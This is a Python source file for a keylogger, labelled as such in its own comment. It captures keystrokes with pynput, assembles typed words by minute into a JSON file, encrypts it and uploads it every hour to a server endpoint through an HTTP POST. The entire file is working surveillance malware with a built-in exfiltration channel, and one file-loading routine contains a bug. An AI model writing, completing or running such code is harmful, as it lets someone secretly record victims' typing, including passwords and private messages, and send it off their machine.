import time
import os
import json
from pynput import keyboard
from cryptography.fernet import Fernet
import requests
import threading

# Keylogger: collects words, saves to JSON hourly, encrypts, saves locally, and sends to server

class KeyLoggerService:
    def __init__(self):
        self.current_word = ""  # Current word being typed
        self.words_by_minute = {}  # Dict: minute -> list of words

    def collect_key(self, key):
        # Collect key: build words (space-separated)
        if hasattr(key, 'char') and key.char:
            if key.char == ' ':  # Space: save word
                if self.current_word:
                    minute = self.get_time_minute()
                    if minute not in self.words_by_minute:
                        self.words_by_minute[minute] = []
                    self.words_by_minute[minute].append(self.current_word)
                    self.current_word = ""
            else:  # Add char to word
                self.current_word += key.char

    def get_time_minute(self):
        # Get current time: 'YYYY-MM-DD HH:MM'
        return time.strftime("%Y-%m-%d %H:%M")

class FileWriter:
    def __init__(self, device_id: str, json_path: str = "keyfile.json"):
        self.device_id = device_id  # Device ID
        self.json_path = json_path  # JSON file path

    def write_to_file(self, data):
        # Write data to JSON file as array of records
        if not data:
            return
        existing_data = self.load_existing_data()
        for minute, words in data.items():
            record = {"device_id": self.device_id, "time": minute, "words": words}
            existing_data.append(record)
        with open(self.json_path, "w", encoding="utf-8") as f:
            json.dump(existing_data, f, indent=2)

    def load_existing_data(self):
        # Load existing JSON array or return empty list
        if not os.path.exists(self.json_path):
            return []
        try:
            with open(self.json_path, "r", encoding="utf-8") as f:
                return json.load(f) if isinstance(json.load(f), list) else []
        except:
            return []

class Encryptor:
    def __init__(self, key_path: str = "key.key"):
        self.key_path = key_path
        self.key = self.create_or_load_key()

    def create_or_load_key(self):
        # Create or load encryption key (stays local)
        if os.path.exists(self.key_path):
            with open(self.key_path, "rb") as f:
                return f.read()
        key = Fernet.generate_key()
        with open(self.key_path, "wb") as f:
            f.write(key)
        return key

    def encrypt_data(self, file_path):
        # Encrypt file to bytes
        with open(file_path, "rb") as f:
            data = f.read()
        return Fernet(self.key).encrypt(data)

class NetworkWriter:
    def send_to_server(self, encrypted_data, server_url="http://127.0.0.1:5000/upload"):
        # Send encrypted data to server (no key sent)
        files = {"file": ("encrypted_file.bin", encrypted_data)}
        try:
            resp = requests.post(server_url, files=files, timeout=10)
            print(f"Sent to server: {resp.status_code} {resp.text}")
            return resp
        except Exception as e:
            print(f"Error sending to server: {e}")
            return None

class KeyLoggerManager:
    def __init__(self, service: KeyLoggerService, writer: FileWriter, encryptor: Encryptor, network: NetworkWriter):
        self.service = service
        self.writer = writer
        self.encryptor = encryptor
        self.network = network
        self.current_hour = self.get_time_hour()
        self.running = True
        # Start background thread to check hour
        threading.Thread(target=self.run_hourly_check, daemon=True).start()

    def get_time_hour(self):
        # Get current hour: 'YYYY-MM-DD HH'
        return time.strftime("%Y-%m-%d %H")

    def run_hourly_check(self):
        # Check every 60s if hour changed, then save & send
        while self.running:
            time.sleep(60)
            if self.get_time_hour() != self.current_hour:
                self.save_and_send()
                self.current_hour = self.get_time_hour()

    def save_and_send(self):
        # Save to JSON, encrypt, save locally, and send
        self.writer.write_to_file(self.service.words_by_minute)
        if os.path.exists(self.writer.json_path):
            encrypted = self.encryptor.encrypt_data(self.writer.json_path)
            # Save encrypted file locally
            with open("encrypted_file.bin", "wb") as f:
                f.write(encrypted)
            print(f"Saved encrypted file to 'encrypted_file.bin'")
            self.network.send_to_server(encrypted)
        self.service.words_by_minute = {}  # Clear memory

    def process_key(self, key):
        # Process key and check hour
        self.service.collect_key(key)
        if self.get_time_hour() != self.current_hour:
            self.save_and_send()
            self.current_hour = self.get_time_hour()

    def start_logging(self):
        # Start keyboard listener, save & send on stop
        try:
            with keyboard.Listener(on_release=self.process_key) as listener:
                listener.join()
        except KeyboardInterrupt:
            self.running = False
            self.save_and_send()  # Save & send on manual stop
            print("Stopped by user")

if __name__ == "__main__":
    service = KeyLoggerService()
    writer = FileWriter(device_id=os.getenv("DEVICE_ID", "MY-PC"))
    encryptor = Encryptor()
    network = NetworkWriter()
    manager = KeyLoggerManager(service, writer, encryptor, network)
    manager.start_logging()